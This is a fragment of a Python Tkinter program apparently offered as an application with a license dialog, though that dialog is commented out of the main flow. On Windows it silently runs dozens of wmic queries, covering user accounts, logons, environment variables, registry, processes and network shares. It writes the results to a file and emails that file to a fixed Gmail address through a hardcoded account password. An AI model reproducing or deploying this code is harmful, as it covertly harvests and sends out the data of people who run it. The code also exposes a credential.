        var_for_insert.insert(float(f"{line}.{bold_index}"),f"{bold_word}",f"boold{style_index}")
        var_for_insert.tag_config(f"boold{style_index}",font=(pfonty,pfonts,pfontb))
        var_for_insert.insert(float(f"{line}.{ab_index}"),f"{the_end}\n",f"nboold{style_index}")
        var_for_insert.tag_config(f"nboold{style_index}",font=(pfonty,pfonts,pfontw))
    def put_in_color(line,colum,string,var_for_insert,style_index,color,BGColor):
        var_for_insert.insert(float(f"{line}.{colum}"),f"{string}\n",f"red{style_index}")
        var_for_insert.tag_config(f"red{style_index}",foreground=f"{color}",background=f"{BGColor}")
    def put_in_bold_and_color(line,string,var_for_insert,pfonty,pfonts,pfontb,pfontw,style_index,color,BGColor):
        default=[]
        this=colum=bold_index=ab_index=0
        bold_word=the_end=the_beg=""
        for b in string:default.append(b)
        b=0
        while b<len(default):
            if this==2:
                the_end+=default[b]
            elif default[b]=="_" and default[b+1]=="_" and this==1:
                ab_index=b+4
                this=2
                b+=1
            elif this==1:
                bold_word+=default[b]
            elif default[b]=="_" and default[b+1]=="_" and this==0:
                bold_index=b+3
                this=1
                b+=1
            else:
                the_beg+=default[b] 
            b+=1
        # print(f"default={default},this={this},colum={colum},bold_index={bold_index},ab_index={ab_index},bold_word={bold_word},the_end={the_end},the_beg={the_beg}") 
        var_for_insert.insert(float(f"{line}.{colum}"),f"{the_beg}")#,"bboold{style_index}")
        #var_for_insert.tag_config(f"bboold{style_index}",font=(pfonty,pfonts,pfontw),foreground=f"{color}",background=f"{BGColor}")
        var_for_insert.insert(float(f"{line}.{bold_index}"),f"{bold_word}",f"boold{style_index}")
        var_for_insert.tag_config(f"boold{style_index}",font=(pfonty,pfonts,pfontb),foreground=f"{color}",background=f"{BGColor}")
        var_for_insert.insert(float(f"{line}.{ab_index}"),f"{the_end}\n",f"nboold{style_index}")
        var_for_insert.tag_config(f"nboold{style_index}",font=(pfonty,pfonts,pfontw),foreground=f"{color}",background=f"{BGColor}")

    def license(self):
        """display the licence"""
        def refused():
            """The user has refused to accept the licence, aborting"""
            TT.destroy()
            TTT=Tk()
            TTT["bg"]=self.BGC
            TTT.title("License - Refused")
            TTT.geometry(f"{self.title_x}x{self.title_y}")
            TTT.minsize(self.title_x,self.title_y)
            FrameText=Frame(TTT,borderwidth=0,relief=FLAT,bg="white")
            FrameText.pack(fill=X,side=TOP)
            FrameButt=Frame(TTT,borderwidth=0,relief=FLAT,bg="white")
            FrameButt.pack(fill=X,side=TOP)
            TITLE=Label(FrameText,text="You have refused to accept the license.",bg=self.BGC, font=(self.pfonty,self.pfonts,self.pfontw))
            TITLE.pack(fill=X,pady=0)
            TITLE2=Label(FrameText,text="This program is now aborting",bg=self.BGC, font=(self.pfonty,self.pfonts,self.pfontw))
            TITLE2.pack(fill=X,pady=0)
            boutonDeny=Button(FrameButt, text="Quit", command=TTT.destroy, font=(self.pfonty,self.pfonts,self.pfontw))
            boutonDeny.pack(anchor=CENTER)
            TTT.mainloop()
        def accepted():
            """The user has accepted the licence, proceeding to the rest of the program"""
            TT.destroy()
            start.Check_Windows(self)
        TT=Tk()
        TT["bg"]="white"
        TT.title("License")
        TT.geometry(f"{self.title_x}x{self.title_y}")
        TT.minsize(self.title_x,self.title_y)
        FrameText=Frame(TT,borderwidth=0,relief=FLAT,bg=self.BGC)
        FrameText.pack(fill=X,side=TOP,pady=3)
        FrameLicence=Frame(TT,borderwidth=0,relief=FLAT,bg=self.BGC)
        FrameLicence.pack(fill=X,side=TOP)
        FrameButt=Frame(TT,borderwidth=0,relief=FLAT,bg=self.BGC)
        FrameButt.pack(fill=X,side=TOP,pady=10)
        TITLE=Label(FrameText,text="Please read and accept this license before proceeding.",bg=self.BGC,fg=self.FGC,font=(self.pfonty,self.pfonts,self.pfontw))
        TITLE.pack(fill=X,pady=0)
        Test=Text(FrameLicence,cursor="X_cursor",state="normal",wrap="word",exportselection=0,width=500,height=22,font=(self.pfonty,self.pfonts,self.pfontw),padx=5,pady=5)
        for z in range(len(self.my_list)):
            DisplayTkinter.put_in_color(z+1,0,f"{self.my_list[z]}",Test,f"a{z}",self.infoCFG,self.infoCBG)
        DisplayTkinter.put_in_color(1+len(self.my_list),0,"\n",Test,f"a{1+len(self.my_list)}",self.infoCBG,self.infoCFG)
        DisplayTkinter.put_in_color(2+len(self.my_list),0,"Description:",Test,f"a{2+len(self.my_list)}",self.infoCBG,self.infoCFG)#\n
        for i in range(len(self.DL)):
            if i==0 or i==2 or i==4 or i==10:
                DisplayTkinter.put_in_bold(i+(len(self.my_list)+self.Description),f"{self.DL[i]}",Test,self.pfonty,self.pfonts,self.pfontw,self.pfontb,i)
            elif i==1 or i==8:
                DisplayTkinter.put_in_color(i+(len(self.my_list)+self.Description),0,f"{self.DL[i]}",Test,i,"red",self.infoCFG)
            elif i==3:
                DisplayTkinter.put_in_bold_and_color(i+(len(self.my_list)+self.Description),f"{self.DL[i]}",Test,self.pfonty,self.pfonts,self.pfontb,self.pfontw,i,"red",self.infoCFG)
            else:
                Test.insert(float(i+(len(self.my_list)+self.Description)),f"{self.DL[i]}\n")
        for i in range(20):
            DisplayTkinter.put_in_color(i+(len(self.my_list)+self.Description)+len(self.DL),0," ",Test,f"z{i}",self.infoCBG,self.infoCFG)
        Test.config(state="disabled")
        Test.pack()
        boutonDeny=Button(FrameButt, text="Refuse", font=(self.pfonty,self.pfonts,self.pfontw), fg=self.FGC, command=refused)
        boutonDeny.pack(side=LEFT, padx=5)
        boutonAccept=Button(FrameButt, text="Accept", font=(self.pfonty,self.pfonts,self.pfontw), fg=self.FGC, command=accepted)
        boutonAccept.pack(side=RIGHT,padx=5)
        TT.mainloop()

    def loading(self):
        print("to come")
    def display_found(self):
        print("to come")
    def Author(self):
        print("to come")
class start(root):
    def Computer_vars(self):
        get.S_v_r(self)
        get.U_v_r(self)
        get.S_i_r(self)
    def Display_vars(self):
        def display_list(list):
            for i in list:
                print(f"list[{i}]={list[i]}")
        try:
            display_list(self.System_vars_result)
        except:print("failed")
        try:
            display_list(self.User_vars_result)
        except:print("failed")
        try:
            display_list(self.system_info_result)
        except:print("failed")
    def InitialiseWMICS(self):
        get.time_update()
        print(RI.date)
        get.Write_to("wmic_info.txt","",1)
        get.Write_to("wmic_info.txt",f"\n\n====================================================================================\nWMIC\nLog of the:\n{RI.date.day}/{RI.date.month}/{RI.date.year}\n{RI.date.hour}:{RI.date.minute}:{RI.date.second}::{RI.date.microsecond}\n====================================================================================\n",2)
        print("get.wmic.csproduct(self)")
        get.wmic.csproduct(self)
        # print("get.wmic.ALIAS(self)")
        # get.wmic.ALIAS(self)
        print("get.wmic.BASEBOARD(self)")
        get.wmic.BASEBOARD(self)
        print("get.wmic.BIOS(self)")
        get.wmic.BIOS(self)
        print("get.wmic.BOOTCONFIG(self)")
        get.wmic.BOOTCONFIG(self)
        print("get.wmic.COMPUTERSYSTEM(self)")
        get.wmic.COMPUTERSYSTEM(self)
        print("get.wmic.CPU(self)")
        get.wmic.CPU(self)
        print("get.wmic.DCOMAPP(self)")
        get.wmic.DCOMAPP(self)
        print("get.wmic.DESKTOP(self)")
        get.wmic.DESKTOP(self)
        print("get.wmic.DESKTOPMONITOR(self)")
        get.wmic.DESKTOPMONITOR(self)
        print("get.wmic.DEVICEMEMORYADDRESS(self)")
        get.wmic.DEVICEMEMORYADDRESS(self)
        print("get.wmic.DISKDRIVE(self)")
        get.wmic.DISKDRIVE(self)
        print("get.wmic.DMACHANNEL(self)")
        get.wmic.DMACHANNEL(self)
        print("get.wmic.ENVIRONMENT(self)")
        get.wmic.ENVIRONMENT(self)
        print("get.wmic.GROUP(self)")
        get.wmic.GROUP(self)
        print("get.wmic.IDECONTROLLER(self)")
        get.wmic.IDECONTROLLER(self)
        print("get.wmic.IRQ(self)")
        get.wmic.IRQ(self)
        print("get.wmic.LOADORDER(self)")
        get.wmic.LOADORDER(self)
        print("get.wmic.LOGICALDISK(self)")
        get.wmic.LOGICALDISK(self)
        print("get.wmic.LOGON(self)")
        get.wmic.LOGON(self)
        print("get.wmic.MEMCACHE(self)")
        get.wmic.MEMCACHE(self)
        print("get.wmic.MEMORYCHIP(self)")
        get.wmic.MEMORYCHIP(self)
        print("get.wmic.MEMPHYSICAL(self)")
        get.wmic.MEMPHYSICAL(self)
        print("get.wmic.NETCLIENT(self)")
        get.wmic.NETCLIENT(self)
        print("get.wmic.NETLOGIN(self)")
        get.wmic.NETLOGIN(self)
        print("get.wmic.NETPROTOCOL(self)")
        get.wmic.NETPROTOCOL(self)
        # print("get.wmic.NETUSE(self)")
        # get.wmic.NETUSE(self)
        print("get.wmic.NIC(self)")
        get.wmic.NIC(self)
        print("get.wmic.NICCONFIG(self)")
        get.wmic.NICCONFIG(self)
        print("get.wmic.NTDOMAIN(self)")
        get.wmic.NTDOMAIN(self)
        print("get.wmic.NTEVENT(self)")
        # get.wmic.NTEVENT(self)
        # print("get.wmic.NTEVENTLOG(self)")
        get.wmic.NTEVENTLOG(self)
        print("get.wmic.ONBOARDDEVICE(self)")
        # get.wmic.ONBOARDDEVICE(self)
        # print("get.wmic.OS(self)")
        get.wmic.OS(self)
        print("get.wmic.PAGEFILE(self)")
        get.wmic.PAGEFILE(self)
        print("get.wmic.PAGEFILESET(self)")
        # get.wmic.PAGEFILESET(self)
        # print("get.wmic.PARTITION(self)")
        get.wmic.PARTITION(self)
        print("get.wmic.PORT(self)")
        get.wmic.PORT(self)
        print("get.wmic.PORTCONNECTOR(self)")
        get.wmic.PORTCONNECTOR(self)
        print("get.wmic.PRINTER(self)")
        get.wmic.PRINTER(self)
        print("get.wmic.PRINTERCONFIG(self)")
        get.wmic.PRINTERCONFIG(self)
        print("get.wmic.PRINTJOB(self)")
        get.wmic.PRINTJOB(self)
        print("get.wmic.PROCESS(self)")
        get.wmic.PROCESS(self)
        print("get.wmic.PRODUCT(self)")
        get.wmic.PRODUCT(self)
        print("get.wmic.QFE(self)")
        get.wmic.QFE(self)
        print("get.wmic.QUOTASETTING(self)")
        get.wmic.QUOTASETTING(self)
        print("get.wmic.RDACCOUNT(self)")
        get.wmic.RDACCOUNT(self)
        print("get.wmic.RDNIC(self)")
        get.wmic.RDNIC(self)
        print("get.wmic.RDPERMISSIONS(self)")
        get.wmic.RDPERMISSIONS(self)
        print("get.wmic.RDTOGGLE(self)")
        get.wmic.RDTOGGLE(self)
        print("get.wmic.RECOVEROS(self)")
        get.wmic.RECOVEROS(self)
        print("get.wmic.REGISTRY(self)")
        get.wmic.REGISTRY(self)
        print("get.wmic.SCSICONTROLLER(self)")
        get.wmic.SCSICONTROLLER(self)
        print("get.wmic.SERVER(self)")
        get.wmic.SERVER(self)
        print("get.wmic.SERVICE(self)")
        get.wmic.SERVICE(self)
        # print("get.wmic.SHADOWCOPY(self)")
        # get.wmic.SHADOWCOPY(self)
        # print("get.wmic.SHADOWSTORAGE(self)")
        # get.wmic.SHADOWSTORAGE(self)
        print("get.wmic.SHARE(self)")
        get.wmic.SHARE(self)
        # print("get.wmic.SOFTWAREELEMENT(self)")
        # get.wmic.SOFTWAREELEMENT(self)
        # print("get.wmic.SOFTWAREFEATURE(self)")
        # get.wmic.SOFTWAREFEATURE(self)
        print("get.wmic.SOUNDDEV(self)")
        get.wmic.SOUNDDEV(self)
        print("get.wmic.STARTUP(self)")
        get.wmic.STARTUP(self)
        print("get.wmic.SYSACCOUNT(self)")
        get.wmic.SYSACCOUNT(self)
        print("get.wmic.SYSDRIVER(self)")
        get.wmic.SYSDRIVER(self)
        print("get.wmic.SYSTEMENCLOSURE(self)")
        get.wmic.SYSTEMENCLOSURE(self)
        print("get.wmic.SYSTEMSLOT(self)")
        get.wmic.SYSTEMSLOT(self)
        # print("get.wmic.TAPEDRIVE(self)")
        # get.wmic.TAPEDRIVE(self)
        # print("get.wmic.TEMPERATURE(self)")
        # get.wmic.TEMPERATURE(self)
        print("get.wmic.TIMEZONE(self)")
        get.wmic.TIMEZONE(self)
        # print("get.wmic.UPS(self)")
        # get.wmic.UPS(self)
        print("get.wmic.USERACCOUNT(self)")
        get.wmic.USERACCOUNT(self)
        # print("get.wmic.VOLTAGE(self)")
        # get.wmic.VOLTAGE(self)
        print("get.wmic.VOLUME(self)")
        get.wmic.VOLUME(self)
        # print("get.wmic.VOLUMEQUOTASETTING(self)")
        # get.wmic.VOLUMEQUOTASETTING(self)
        print("get.wmic.VOLUMEUSERQUOTA(self)")
        get.wmic.VOLUMEUSERQUOTA(self)
        print("get.wmic.WMISET(self)")
        get.wmic.WMISET(self)
        print("Finished")
        print(f"wmic_global_counter={self.wmic_global_counter}")
        print(f"wmic_main_class_counter={self.wmic_main_class_counter}")
        print(RI.date)
        get.Write_to("wmic_info.txt",f"\n====================================================================================\nWMIC\nEnd of log of the:\n{RI.date.day}/{RI.date.month}/{RI.date.year}\n{RI.date.hour}:{RI.date.minute}:{RI.date.second}::{RI.date.microsecond}\n====================================================================================\n",2)
    def DisplayWMICInfo(self):
        print(self.wmic_BOOTCONFIG)
        self.GetWMIC=[self.wmic_csproduct,self.wmic_ALIAS,self.wmic_BASEBOARD,self.wmic_BIOS,self.wmic_BOOTCONFIG,self.wmic_COMPUTERSYSTEM,self.wmic_CPU,self.wmic_DCOMAPP,self.wmic_DESKTOP,self.wmic_DESKTOPMONITOR,self.wmic_DEVICEMEMORYADDRESS,self.wmic_DISKDRIVE,self.wmic_DMACHANNEL,self.wmic_ENVIRONMENT,self.wmic_GROUP,self.wmic_IDECONTROLLER,self.wmic_IRQ,self.wmic_LOADORDER,self.wmic_LOGICALDISK,self.wmic_LOGON,self.wmic_MEMCACHE,self.wmic_MEMORYCHIP,self.wmic_MEMPHYSICAL,self.wmic_NETCLIENT,self.wmic_NETLOGIN,self.wmic_NETPROTOCOL,self.wmic_NIC,self.wmic_NICCONFIG,self.wmic_NTDOMAIN,self.wmic_NTEVENTLOG,self.wmic_OS,self.wmic_PAGEFILE,self.wmic_PARTITION,self.wmic_PORT,self.wmic_PORTCONNECTOR,self.wmic_PRINTER,self.wmic_PRINTERCONFIG,self.wmic_PRINTJOB,self.wmic_PROCESS,self.wmic_PRODUCT,self.wmic_QFE,self.wmic_QUOTASETTING,self.wmic_RDACCOUNT,self.wmic_RDNIC,self.wmic_RDPERMISSIONS,self.wmic_RDTOGGLE,self.wmic_RECOVEROS,self.wmic_REGISTRY,self.wmic_SCSICONTROLLER,self.wmic_SERVER,self.wmic_SERVICE,self.wmic_SHARE,self.wmic_SOUNDDEV,self.wmic_STARTUP,self.wmic_SYSACCOUNT,self.wmic_SYSDRIVER,self.wmic_SYSTEMENCLOSURE,self.wmic_SYSTEMSLOT,self.wmic_TIMEZONE,self.wmic_USERACCOUNT,self.wmic_VOLUME,self.wmic_VOLUMEUSERQUOTA,self.wmic_WMISET,]
        self.GetWMIC_result=[self.csproduct_result,self.ALIAS_result,self.BASEBOARD_result,self.BIOS_result,self.BOOTCONFIG_result,self.COMPUTERSYSTEM_result,self.CPU_result,self.DCOMAPP_result,self.DESKTOP_result,self.DESKTOPMONITOR_result,self.DEVICEMEMORYADDRESS_result,self.DISKDRIVE_result,self.DMACHANNEL_result,self.ENVIRONMENT_result,self.GROUP_result,self.IDECONTROLLER_result,self.IRQ_result,self.LOADORDER_result,self.LOGICALDISK_result,self.LOGON_result,self.MEMCACHE_result,self.MEMORYCHIP_result,self.MEMPHYSICAL_result,self.NETCLIENT_result,self.NETLOGIN_result,self.NETPROTOCOL_result,self.NIC_result,self.NICCONFIG_result,self.NTDOMAIN_result,self.NTEVENTLOG_result,self.OS_result,self.PAGEFILE_result,self.PARTITION_result,self.PORT_result,self.PORTCONNECTOR_result,self.PRINTER_result,self.PRINTERCONFIG_result,self.PRINTJOB_result,self.PROCESS_result,self.PRODUCT_result,self.QFE_result,self.QUOTASETTING_result,self.RDACCOUNT_result,self.RDNIC_result,self.RDPERMISSIONS_result,self.RDTOGGLE_result,self.RECOVEROS_result,self.REGISTRY_result,self.SCSICONTROLLER_result,self.SERVER_result,self.SERVICE_result,self.SHARE_result,self.SOUNDDEV_result,self.STARTUP_result,self.SYSACCOUNT_result,self.SYSDRIVER_result,self.SYSTEMENCLOSURE_result,self.SYSTEMSLOT_result,self.TIMEZONE_result,self.USERACCOUNT_result,self.VOLUME_result,self.VOLUMEUSERQUOTA_result,self.WMISET_result,]
        for i in range(len(self.GetWMIC)):
            #for b in range(len(self.GetWMIC[i])):
            #    print(f"i={i},b={b}")
            #    print(f"\n{self.GetWMIC[i]}={self.GetWMIC_result[i][str(self.GetWMIC[i])]}")#[self.GetWMIC[i]]
            print(f"i={i}\nself.GetWMIC[{i}]={self.GetWMIC[i]}")#[self.GetWMIC[i]]
    def up(self):
        print("In Computer_vars")
        start.Computer_vars(self)
        print("In Display_vars")
        start.Display_vars(self)
        print("In InitialiseWMICS")
        start.InitialiseWMICS(self)
        print("In DisplayWMICInfo")
        start.DisplayWMICInfo(self)
    def FirstWindow(self):
        TT=Tk()
        TT["bg"]="white"
        sleep(3)
        TT.mainloop()
    def Check_Windows(self):
        c=os.name
        if c=="nt":
            self.Windows=True
            d="y"
            if d=="y":start.up(self)
            email.email(self)
        else:
            self.Windows=False
class email(root):
    def email(self):
        of="Le fichier de {}.".format(os.getenv("username"))
        EMAIL_ADDRESS="letellier.henry@gmail.com"
        EMAIL_PASSWORD="whrcvpgfvwokgzpo"
        #body=of
        Subject=of
        content="Plain Text "
        msg = EmailMessage()
        msg['Subject'] = Subject
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS

        msg.set_content(content)
        images=["wmic_info.txt"]

        for i in range(len(images)):#images
            with open(images[i],"rb") as f:#i
                file_data=f.read()
                file_type=".txt"
                file_name=f.name

            msg.add_attachment(file_data,maintype='image', subtype=file_type,filename=file_name)
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

RI=root()
__Description__=""
for i in range(len(RI.DL)):__Description__+=f" {RI.DL[i]}\n"
__DESCRIPTION__=__description__=__Description__
pause()
print(__Description__)
pause()
#DisplayTkinter.license(RI)
start.Check_Windows(RI)
pause()
pause()
pause()
pause()
